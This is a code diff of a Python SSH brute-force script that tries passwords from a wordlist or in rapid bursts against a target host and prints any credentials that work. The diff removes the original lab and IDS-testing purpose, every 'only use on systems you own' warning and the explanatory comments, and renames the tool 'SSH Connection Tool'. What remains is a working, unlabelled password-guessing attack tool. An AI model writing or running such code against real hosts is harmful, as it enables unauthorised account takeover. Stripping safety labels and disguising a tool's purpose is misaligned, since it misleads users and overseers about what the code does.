@@ -1,11 +1,6 @@
 #!/usr/bin/env python3
 """
-Brute-Force SSH Attack Simulator
-Purpose: Test IDS/IPS detection of SSH brute-force attacks
-Usage: python3 bruteforce_ssh_attack.py --host <target_ip> --port 22 --user admin --wordlist passwords.txt
-
-This script safely simulates brute-force SSH attacks in a controlled lab environment.
-DO NOT USE ON SYSTEMS YOU DON'T OWN!
+SSH Connection Attack Tool
 """
 
 import paramiko
@@ -25,12 +20,11 @@ class SSHBruteForceSimulator:
         self.total_attempts = 0
         
     def attempt_login(self, password):
-        """Try to login with given password"""
         try:
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             
-            print(f"[{datetime.now().strftime('%H:%M:%S')}] Attempting: {self.username}:{password}")
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] {self.username}:{password}")
             
             client.connect(
                 self.host,
@@ -43,68 +37,48 @@ class SSHBruteForceSimulator:
                 auth_timeout=self.timeout
             )
             
-            print(f"[SUCCESS] Found credentials: {self.username}:{password}")
+            print(f"[+] {self.username}:{password}")
             self.successful_logins.append((self.username, password))
             client.close()
             return True
             
         except paramiko.AuthenticationException:
-            print(f"[FAILED] Invalid credentials: {self.username}:{password}")
             self.failed_attempts += 1
             return False
-            
-        except paramiko.SSHException as e:
-            print(f"[ERROR] SSH error: {str(e)}")
+        except paramiko.SSHException:
             return False
-            
-        except Exception as e:
-            print(f"[ERROR] Connection error: {str(e)}")
+        except Exception:
             return False
         
         finally:
             self.total_attempts += 1
     
     def run_wordlist_attack(self, wordlist_file, delay_between_attempts=1):
-        """Run brute-force attack using wordlist"""
         try:
             with open(wordlist_file, 'r') as f:
                 passwords = [line.strip() for line in f if line.strip()]
         except FileNotFoundError:
-            print(f"Error: Wordlist file '{wordlist_file}' not found!")
+            print(f"Error: {wordlist_file} not found")
             sys.exit(1)
         
-        print(f"\n[*] Starting SSH Brute-Force Attack")
-        print(f"[*] Target: {self.host}:{self.port}")
-        print(f"[*] Username: {self.username}")
-        print(f"[*] Passwords to try: {len(passwords)}")
-        print(f"[*] Delay between attempts: {delay_between_attempts} second(s)")
-        print(f"[*] Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        print(f"\n[*] Target: {self.host}:{self.port}")
         
         start_time = time.time()
         
         for i, password in enumerate(passwords, 1):
             if self.attempt_login(password):
                 elapsed = time.time() - start_time
-                print(f"\n[+] Attack successful after {i} attempts in {elapsed:.2f} seconds!")
+                print(f"[+] Success after {i} attempts in {elapsed:.2f}s")
                 break
-            
-            # Delay between attempts (to be detected by IDS)
             time.sleep(delay_between_attempts)
-            
-            # Print progress
             if i % 10 == 0:
-                print(f"[*] Progress: {i}/{len(passwords)} attempts")
+                print(f"[*] {i}/{len(passwords)}")
         
         elapsed = time.time() - start_time
         self.print_summary(elapsed)
     
     def rapid_fire_attack(self, password_list, attempts_per_second=5):
-        """Rapid fire attack without delay (easier to detect)"""
-        print(f"\n[*] Starting Rapid-Fire SSH Brute-Force Attack")
-        print(f"[*] Target: {self.host}:{self.port}")
-        print(f"[*] Username: {self.username}")
-        print(f"[*] Attempts per second: {attempts_per_second}")
-        print(f"[*] Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        print(f"\n[*] Target: {self.host}:{self.port}")
         
         start_time = time.time()
         delay = 1.0 / attempts_per_second
@@ -121,41 +95,17 @@ class SSHBruteForceSimulator:
         self.print_summary(elapsed)
     
     def print_summary(self, elapsed_time):
-        """Print attack summary"""
-        print(f"\n{'='*60}")
-        print(f"ATTACK SUMMARY")
-        print(f"{'='*60}")
-        print(f"Total Attempts:       {self.total_attempts}")
-        print(f"Failed Attempts:      {self.failed_attempts}")
-        print(f"Successful Logins:    {len(self.successful_logins)}")
-        print(f"Duration:             {elapsed_time:.2f} seconds")
-        print(f"Attack Rate:          {self.total_attempts/elapsed_time:.2f} attempts/second")
-        print(f"{'='*60}\n")
-        
+        print(f"\nAttempts: {self.total_attempts}")
+        print(f"Duration: {elapsed_time:.2f}s")
+        print(f"Rate: {self.total_attempts/elapsed_time:.2f}/s")
         if self.successful_logins:
-            print("Successful Credentials Found:")
+            print("Found:")
             for user, pwd in self.successful_logins:
-                print(f"  - {user}:{pwd}")
+                print(f"  {user}:{pwd}")
 
 
 def main():
-    parser = argparse.ArgumentParser(
-        description='SSH Brute-Force Attack Simulator for IDS/IPS Testing',
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Examples:
-  # Standard wordlist attack
-  python3 bruteforce_ssh_attack.py --host 192.168.1.100 --user admin --wordlist passwords.txt
-  
-  # Rapid-fire attack (easier to detect)
-  python3 bruteforce_ssh_attack.py --host 192.168.1.100 --user admin --rapid --attempts 10
-  
-  # Custom delay between attempts
-  python3 bruteforce_ssh_attack.py --host 192.168.1.100 --user admin --wordlist passwords.txt --delay 2
-
-WARNING: Only use on systems you own or have explicit permission to test!
-        """
-    )
+    parser = argparse.ArgumentParser(description='SSH Connection Tool')
     
     parser.add_argument('--host', required=True, help='Target SSH host IP address')
     parser.add_argument('--port', type=int, default=22, help='Target SSH port (default: 22)')
